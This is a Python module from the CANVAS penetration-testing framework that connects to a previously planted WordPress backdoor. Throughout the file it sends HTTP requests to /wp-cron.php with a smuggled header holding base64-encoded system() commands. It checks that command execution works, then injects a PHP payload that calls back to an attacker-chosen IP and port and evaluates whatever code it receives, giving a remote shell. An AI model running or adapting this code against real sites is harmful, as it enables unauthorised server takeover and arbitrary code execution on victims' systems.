#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2012
#http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import base64

# path appends
if '.' not in sys.path: 
    sys.path.append('.')

# CANVAS imports
from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine


NAME                           = "wordpress_backdoor_connect"
DESCRIPTION                    = "Connect to wordpress backdoor"
DOCUMENTATION                  = {}
DOCUMENTATION["Repeatability"] = "Infinite"

VERSION                        = "1.0"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Commands"
PROPERTY['SITE']               = "Local"
PROPERTY['ARCH']               = [ ["Windows"] ]

NOTES = """

This module can use to connect to a WordPress backdoor created by
the wordpress_backdoor module.

"""

CHANGELOG="""
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port = 8080
        self.host = ""
        self.badstring = ""
        self.done = 0
        self.name = NAME    

    def usage(self):
        print "Base options:"
        print "-v <version> -t <target ip> -l <callback ip> -d <callback port>"
        print "-O port:port"
    
    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        
    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]
        
    # Check if system() or eval() has been disabled
    
    def wp_test(self, socket):
        payload = "wpvalid: wp_user=system; wp_time=" + base64.b64encode("php -r \"echo ('Test');\"")
        
        data  = "GET " + "/wp-cron.php HTTP/1.1\r\n"
        data += "Host: " + self.host + "\r\n"
        data += "Connection: keep-alive\r\n"
        data += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        data += "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36\r\n"
        data += payload + "\r\n"
        data += "Accept-Encoding: gzip,deflate,sdch\r\n"
        data += "Accept-Language: en-US,en;q=0.8\r\n\r\n"
        
        self.websend(socket, data)
        
        response = self.webrecv(socket, size=8192)
        
        if "Test" not in response: return False
        
        payload = "wpvalid: wp_user=system; wp_time=" + base64.b64encode("php -r \"eval(\\\"echo ('Second test');\\\");\"")
        
        data  = "GET " + "/wp-cron.php HTTP/1.1\r\n"
        data += "Host: " + self.host + "\r\n"
        data += "Connection: keep-alive\r\n"
        data += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        data += "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36\r\n"
        data += payload + "\r\n"
        data += "Accept-Encoding: gzip,deflate,sdch\r\n"
        data += "Accept-Language: en-US,en;q=0.8\r\n\r\n"
        
        self.websend(socket, data)        
        response = self.webrecv(socket, size=8192)
        
        if "Second test" not in response: return False
        return True
        
        
    def connectBackdoor(self):
        localhost = self.callback.ip
        localport = self.callback.port
        
        socket = self.gettcpsock()
        
        try:
            socket.connect((self.host, self.port))
        except Exception:
            self.log("\n[-] Cannot connect to " + self.host + ":"+ str(self.port) +"\n")
            return False
            
        ret = self.wp_test(socket)
            
        # i had to do this because \n and quotes signs break all code, so..        
        php = """function read_block($sock) { $data=fread($sock,4); $size=(ord($data{0}) * (pow(2,24))) + (ord($data{1}) * pow(2,16)) + (ord($data{2}) * pow(2,8)) + ord($data{3}); $data2=''; while ($size > 0 ){$data3=fread($sock,$size); if ($data3==FALSE) { break; } $data2=$data2.$data3; $size-=strlen($data3); } return $data2; } $f=fsockopen(\\\"LOCALHOST\\\",LOCALPORT); if ($f) { while (1) { $data=read_block($f); if ($data==''){ break; } eval($data); } }"""
        
        mosdef=php.replace("LOCALHOST",str(localhost))
        mosdef=mosdef.replace("LOCALPORT",str(localport))  
        
        cmd = "system"
        
        payload = "wpvalid: wp_user=" + cmd + "; wp_time=" + base64.b64encode("php -r \"" + mosdef + "\"")
        
        data  = "GET " + "/wp-cron.php HTTP/1.1\r\n"
        data += "Host: " + self.host + "\r\n"
        data += "Connection: keep-alive\r\n"
        data += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        data += "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36\r\n"
        data += payload + "\r\n"
        data += "Accept-Encoding: gzip,deflate,sdch\r\n"
        data += "Accept-Language: en-US,en;q=0.8\r\n\r\n"
        
        self.websend(socket, data)
        
        return self.webrecv(socket, size=8192)
        
    def run(self):
        self.getargs()
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME,self.host,self.port))
        self.log("Attacking %s:%d"%(self.host,self.port))
        
        host_info = {}
        # set host info dict
        host_info['host'] = self.host
        host_info['port'] = self.port
        
        response = self.connectBackdoor()
        
        ret = self.ISucceeded()
        
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)" % (NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME,self.host,self.port))
        
        return ret


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
        
